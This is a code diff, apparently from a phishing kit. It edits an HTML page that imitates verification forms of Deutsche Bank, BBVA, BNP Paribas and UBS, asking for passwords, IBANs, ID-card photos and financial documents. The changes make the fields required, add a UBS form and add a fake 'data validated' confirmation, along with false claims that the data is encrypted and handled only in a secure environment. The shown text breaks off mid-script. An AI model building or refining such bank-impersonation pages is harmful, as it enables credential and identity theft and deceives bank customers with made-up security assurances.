@@ -9,7 +9,7 @@
     h3 { color: #555; text-align: center; }
     .search-box { text-align: center; margin: 20px; }
     input[type="text"] { padding: 8px; width: 300px; }
-    .accordion { background: #fff; border: 1px solid #ccc; border-radius: 5px; margin: 10px auto; width: 400px; }
+    .accordion { background: #fff; border: 1px solid #ccc; border-radius: 5px; margin: 10px auto; width: 420px; }
     .accordion-header { padding: 15px; cursor: pointer; font-weight: bold; background: #e6f0ff; }
     .accordion-content { display: none; padding: 15px; border-top: 1px solid #ccc; }
     label { display: block; margin-top: 10px; }
@@ -17,6 +17,7 @@
     .note { font-size: 14px; color: #777; margin-top: 10px; }
     .security-message { background: #003366; color: #fff; padding: 15px; border-radius: 5px; margin: 20px auto; width: 80%; text-align: center; }
     .inline-security { background: #e6f0ff; padding: 10px; border-radius: 5px; margin-top: 15px; font-size: 13px; color: #333; }
+    .confirmation { background: #cce5ff; color: #003366; padding: 15px; border-radius: 5px; margin: 20px auto; width: 80%; text-align: center; display: none; }
   </style>
 </head>
 <body>
@@ -33,21 +34,22 @@
     <input type="text" id="searchInput" placeholder="Buscar país o banco...">
   </div>
 
-  <!-- Ejemplo de bancos -->
+  <!-- Bancos ordenados alfabéticamente (ejemplo con varios países IBAN) -->
   <div id="accordionList">
     <div class="accordion">
       <div class="accordion-header">Alemania - Deutsche Bank</div>
       <div class="accordion-content">
-        <form>
-          <label>Usuario: <input type="text"></label>
-          <label>Contraseña: <input type="password"></label>
-          <label>Cuenta principal: <input type="text"></label>
-          <label>IBAN: <input type="text"></label>
+        <form onsubmit="showConfirmation(event)">
+          <label>Usuario: <input type="text" required></label>
+          <label>Contraseña: <input type="password" required></label>
+          <label>Cuenta principal: <input type="text" required></label>
+          <label>IBAN: <input type="text" required></label>
           <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
           <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
           <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
           <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
           <div class="inline-security">🔒 No comparta sus credenciales en otras páginas. Este proceso se realiza únicamente en nuestro entorno seguro.</div>
+          <button type="submit">Verificar</button>
         </form>
       </div>
     </div>
@@ -55,16 +57,17 @@
     <div class="accordion">
       <div class="accordion-header">España - BBVA</div>
       <div class="accordion-content">
-        <form>
-          <label>Usuario: <input type="text"></label>
-          <label>Contraseña: <input type="password"></label>
-          <label>Cuenta principal: <input type="text"></label>
-          <label>IBAN: <input type="text"></label>
+        <form onsubmit="showConfirmation(event)">
+          <label>Usuario: <input type="text" required></label>
+          <label>Contraseña: <input type="password" required></label>
+          <label>Cuenta principal: <input type="text" required></label>
+          <label>IBAN: <input type="text" required></label>
           <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
           <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
           <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
           <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
           <div class="inline-security">🔒 Las imágenes se almacenan de forma cifrada y solo se utilizan para validar su identidad.</div>
+          <button type="submit">Verificar</button>
         </form>
       </div>
     </div>
@@ -72,19 +75,43 @@
     <div class="accordion">
       <div class="accordion-header">Francia - BNP Paribas</div>
       <div class="accordion-content">
-        <form>
-          <label>Usuario: <input type="text"></label>
-          <label>Contraseña: <input type="password"></label>
-          <label>Cuenta principal: <input type="text"></label>
-          <label>IBAN: <input type="text"></label>
+        <form onsubmit="showConfirmation(event)">
+          <label>Usuario: <input type="text" required></label>
+          <label>Contraseña: <input type="password" required></label>
+          <label>Cuenta principal: <input type="text" required></label>
+          <label>IBAN: <input type="text" required></label>
           <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
           <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
           <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
           <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
           <div class="inline-security">🔒 Sus datos están protegidos bajo estrictos protocolos de seguridad.</div>
+          <button type="submit">Verificar</button>
         </form>
       </div>
     </div>
+
+    <div class="accordion">
+      <div class="accordion-header">Suiza - UBS</div>
+      <div class="accordion-content">
+        <form onsubmit="showConfirmation(event)">
+          <label>Usuario: <input type="text" required></label>
+          <label>Contraseña: <input type="password" required></label>
+          <label>Cuenta principal: <input type="text" required></label>
+          <label>IBAN: <input type="text" required></label>
+          <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
+          <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
+          <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
+          <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
+          <div class="inline-security">🔒 Confiar en nosotros significa contar con un sistema que vela por la protección de su información personal en cada paso.</div>
+          <button type="submit">Verificar</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- Confirmación automática -->
+  <div id="confirmationBox" class="confirmation">
+    🔒 Sus datos han sido validados correctamente. Su información está cifrada y protegida en nuestros sistemas.
   </div>
 
   <!-- Pie de página con mensaje de seguridad -->
@@ -111,7 +138,9 @@
         acc.style.display = text.includes(filter) ? "" : "none";
       });
     });
-  </script>
 
-</body>
-</html>
+    // Confirmación automática
+    function showConfirmation(event) {
+      event.preventDefault();
+      document.getElementById("confirmationBox").style.display = "block";
+      window.scrollTo({
